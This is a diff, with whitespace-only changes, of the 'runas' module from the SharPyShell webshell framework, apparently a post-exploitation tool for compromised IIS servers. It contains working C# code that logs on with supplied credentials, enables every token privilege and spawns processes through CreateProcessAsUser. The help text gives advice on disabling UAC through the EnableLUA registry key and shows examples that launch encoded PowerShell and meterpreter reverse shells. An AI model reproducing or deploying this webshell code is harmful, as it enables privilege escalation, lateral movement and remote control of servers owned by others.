@@ -11,27 +11,27 @@ class Runas(Module):
     short_help = "Run a cmd.exe /c command spawning a new process as a specific user"
     complete_help = r"""
         This module permits run cmd /c runas command from a local service in a new process running as a specific user.
-        It runs the following Win32 System Calls 'LogonUser' -> 'DuplicateTokenEx' -> 'CreateProcessAsUser' in order 
+        It runs the following Win32 System Calls 'LogonUser' -> 'DuplicateTokenEx' -> 'CreateProcessAsUser' in order
         to spawn a new process out of calling thread of w3wp.exe.
         The calling process will wait until the end of the execution of the spawned process.
         The two processes will communicate through 2 pipeline files (1 for stdout and 1 for stderr).
         The default logon type is 3 (Network_Logon).
         If you set Interactive (2) logon type you will face some UAC restriction problems.
         You can make interactive login without restrictions by setting the following regkey to 0 and restart the server:
-        
+
             HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
-        
+
         If you need to spawn a background or async process, i.e. spawning a reverse shell, set the argument
         'process_timeout_ms' to 0.
-        
+
         Usage:
-            #runas os_command username password [domain] [process_timeout_ms] [logon_type] 
-        
+            #runas os_command username password [domain] [process_timeout_ms] [logon_type]
+
         Positional arguments:
             os_command              command supported by cmd.exe
             username                username of the user
             password                password of the user
-            domain                  domain of the user, if in a domain. 
+            domain                  domain of the user, if in a domain.
                                     Default: ''
             process_timeout_ms      the waiting time (in ms) to use in the WaitForSingleObject() function.
                                     This will halt the process until the spawned process ends and sent the output back to the webshell.
@@ -39,7 +39,7 @@ class Runas(Module):
                                     Default: '60000'
             logon_type              the logon type for the spawned process.
                                     Default: '3'
-        
+
         Examples:
             Run a command as a specific local user
                 #runas whoami user1 password1
@@ -51,7 +51,7 @@ class Runas(Module):
                 #runas 'powershell -nop -noni -enc base64reverse_shell' 'user1' 'password1' '' '0'
             Run a background/async process as a specific domain user, i.e. meterpreter ps1 reverse shell
                 #runas 'powershell -nop -noni -enc base64reverse_shell' 'user1' 'password1' 'domain' '0'
-                                                
+
     """
 
     _runtime_code = r"""
@@ -61,18 +61,18 @@ class Runas(Module):
                 public class SharPyShell
                 {
                     private const string error_string = "{{{SharPyShellError}}}";
-                
+
                     private const int LOGON32_PROVIDER_DEFAULT = 0;
                     private const int LOGON32_PROVIDER_WINNT35 = 1;
                     private const int LOGON32_PROVIDER_WINNT40 = 2;
                     private const int LOGON32_PROVIDER_WINNT50 = 3;
-            
+
                     private const uint GENERIC_ALL = 0x10000000;
                     private const int SecurityImpersonation = 2;
                     private const int TokenType = 1;
-            
+
                     private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
-            
+
                     private const uint WAIT_ABANDONED = 0x00000080;
                     private const uint WAIT_OBJECT_0 = 0x00000000;
                     private const uint WAIT_TIMEOUT = 0x00000102;
@@ -98,7 +98,7 @@ class Runas(Module):
                         public IntPtr hStdOutput;
                         public IntPtr hStdError;
                     }
-                    
+
                     [StructLayout(LayoutKind.Sequential)] private struct PROCESS_INFORMATION
                     {
                         public IntPtr hProcess;
@@ -106,14 +106,14 @@ class Runas(Module):
                         public uint   dwProcessId;
                         public uint   dwThreadId;
                     }
-                    
+
                     [StructLayout(LayoutKind.Sequential)] private struct SECURITY_ATTRIBUTES
                     {
                         public int    Length;
                         public IntPtr lpSecurityDescriptor;
                         public bool   bInheritHandle;
                     }
-                    
+
                     [StructLayout(LayoutKind.Sequential)]
                     private struct LUID
                     {
@@ -127,25 +127,25 @@ class Runas(Module):
                         public LUID Luid;
                         public UInt32 Attributes;
                     }
-                    
+
                     [DllImport("kernel32.dll", EntryPoint="CloseHandle", SetLastError=true, CharSet=CharSet.Auto, CallingConvention=CallingConvention.StdCall)]
                     private static extern bool CloseHandle(IntPtr handle);
-                    
+
                     [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
                     private static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out SafeTokenHandle phToken);
-        
+
                     [DllImport("advapi32.dll", EntryPoint="CreateProcessAsUser", SetLastError=true, CharSet=CharSet.Ansi, CallingConvention=CallingConvention.StdCall)]
                     private static extern bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment, String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-                    
+
                     [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
                     private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, int TokenType, int ImpersonationLevel, ref IntPtr DuplicateTokenHandle);
-                    
+
                     [DllImport("kernel32.dll", SetLastError=true)]
                     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-                    
+
                     [DllImport("advapi32.dll", SetLastError = true)]
                     private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)]ref TOKEN_PRIVILEGES Newstate, int bufferlength, int PreivousState, int Returnlength);
-                    
+
                     [DllImport("advapi32.dll", SetLastError = true)]
                     private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);
 
@@ -155,19 +155,19 @@ class Runas(Module):
                             : base(true)
                         {
                         }
-                    
+
                         [DllImport("kernel32.dll")]
                         [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
                         [SuppressUnmanagedCodeSecurity]
                         [return: MarshalAs(UnmanagedType.Bool)]
                         private static extern bool CloseHandle(IntPtr handle);
-                    
+
                         protected override bool ReleaseHandle()
                         {
                             return CloseHandle(handle);
                         }
                     }
-                                        
+
                     private string EnablePrivilege(string privilege, IntPtr token){
                         string output = "";
                         LUID serLuid = new LUID();
@@ -183,7 +183,7 @@ class Runas(Module):
                         output += "\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
                         return output;
                     }
-                    
+
                     private string EnableAllPrivileges(IntPtr token)
                     {
                         string output="";
@@ -225,7 +225,7 @@ class Runas(Module):
                         output += EnablePrivilege("SeUnsolicitedInputPrivilege", token);
                         return output;
                     }
-                    
+
                     [PermissionSetAttribute(SecurityAction.Demand, Name = "FullTrust")]
                     private string RunAs(string userName, string password, string domainName, string cmd, string stdout_file, string stderr_file, string working_directory, int logon_type, uint process_ms_timeout)
                     {
@@ -243,7 +243,7 @@ class Runas(Module):
                             {
                                 IntPtr runasToken = safeTokenHandle.DangerousGetHandle();
                                 EnableAllPrivileges(runasToken);
-                                
+
                                 string commandLinePath = "";
                                 if(process_ms_timeout>0){
                                     File.Create(stdout_file).Dispose();
@@ -263,7 +263,7 @@ class Runas(Module):
                                     sa.Length               = Marshal.SizeOf(sa);
                                     sa.lpSecurityDescriptor = (IntPtr)0;
                                     Token = WindowsIdentity.GetCurrent().Token;
-                                    
+
                                     ret = DuplicateTokenEx(Token, GENERIC_ALL, ref sa, SecurityImpersonation, TokenType, ref DupedToken);
                                     if (ret == false){
                                          output += error_string + "\nDuplicateTokenEx failed with " + Marshal.GetLastWin32Error();
@@ -273,7 +273,7 @@ class Runas(Module):
                                     si.cb                   = Marshal.SizeOf(si);
                                     si.lpDesktop            = "";
                                     PROCESS_INFORMATION pi  = new PROCESS_INFORMATION();
-                                    
+
                                     ret = CreateProcessAsUser(DupedToken,null,commandLinePath, ref sa, ref sa, false, 0, (IntPtr)0, working_directory, ref si, out pi);
                                     if (ret == false){
                                         output += error_string + "\nCreateProcessAsUser failed with " + Marshal.GetLastWin32Error();
@@ -311,7 +311,7 @@ class Runas(Module):
                         }
                     return output;
                     }
-                    
+
                     public byte[] ExecRuntime()
                     {
                         string output_func=RunAs(@"%s", @"%s", @"%s", @"%s", @"%s", @"%s", @"%s", %s, %s);
